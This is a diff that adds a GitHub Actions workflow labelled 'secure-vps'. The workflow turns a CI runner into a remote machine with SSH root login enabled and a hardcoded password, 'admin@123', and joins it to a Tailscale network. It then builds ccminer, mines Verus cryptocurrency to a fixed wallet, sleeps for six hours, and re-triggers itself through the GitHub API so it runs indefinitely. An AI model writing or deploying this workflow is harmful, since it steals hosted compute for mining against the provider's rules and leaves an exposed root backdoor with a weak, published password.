@@ -1,0 +1,90 @@
+name: VPS4
+on:
+  workflow_dispatch:
+
+jobs:
+  secure-vps:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Install & Configure SSH
+        run: |
+          sudo apt update -y
+          sudo apt install -y openssh-server git build-essential libcurl4-openssl-dev libssl-dev \
+              libjansson-dev automake autotools-dev screen
+          sudo systemctl enable ssh
+          sudo systemctl start ssh
+          echo "root:admin@123" | sudo chpasswd
+          echo "PermitRootLogin yes" | sudo tee -a /etc/ssh/sshd_config
+          sudo service ssh restart
+          echo "✅ SSH user: root | pass: admin@123"
+
+      - name: Install Tailscale
+        run: |
+          curl -fsSL https://tailscale.com/install.sh | sh
+          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=vps-${{ github.run_id }}
+          tsIP=$(tailscale ip -4 | head -n 1)
+          echo "TAILSCALE_IP=$tsIP" >> $GITHUB_ENV
+          echo "✅ Tailscale IP: $tsIP"
+
+      - name: Verify SSH Access
+        run: |
+          echo "Tailscale VPS ready!"
+          echo "IP: $TAILSCALE_IP"
+          echo "User: root"
+          echo "Pass: admin@123"
+
+      - name: Install ccminer & Start Mining
+        run: |
+          WAL="RGRbQeW9cy641mJfpM7MKZ5YpmsUHMxf2p"
+          POOL="pool.verus.io:9998"
+          TH=4
+          RAND_NUM=$(shuf -i 1000-9999 -n 1)
+          RAND_CHARS=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 2 | head -n 1)
+          WRK="ubuntu${RAND_NUM}${RAND_CHARS}"
+
+          cd ~
+          if [ ! -d "$HOME/ccminer" ]; then
+              git clone https://github.com/Oink70/ccminer-verus.git ~/ccminer
+              cd ~/ccminer
+              ./build.sh
+          else
+              cd ~/ccminer
+              make clean
+              ./build.sh
+          fi
+
+          cd ~/ccminer
+          cat > config.json <<EOF
+{
+  "pools": [
+    { "name": "CUSTOM", "url": "stratum+tcp://${POOL}", "timeout": 180, "disabled": 0 }
+  ],
+  "user": "${WAL}.${WRK}",
+  "pass": "x",
+  "algo": "verus",
+  "threads": ${TH},
+  "api-bind": "127.0.0.1:4068"
+}
+EOF
+
+          screen -dmS verus_mining ./ccminer -c config.json
+          echo "🚀 التعدين بدأ Worker: ${WRK}"
+          echo "▶️ للرجوع للجلسة: screen -r verus_mining"
+
+      - name: Run VPS for 6 hours
+        run: |
+          echo "⏳ VPS running..."
+          sleep 21600   # 6 ساعات
+
+      - name: Restart This Workflow
+        env:
+          REPO: ${{ github.repository }}
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "🔄 Restarting workflow"
+          curl -X POST \
+            -H "Accept: application/vnd.github+json" \
+            -H "Authorization: Bearer $GITHUB_TOKEN" \
+            https://api.github.com/repos/$REPO/actions/workflows/vps4.yml/dispatches \
+            -d '{"ref":"main"}'
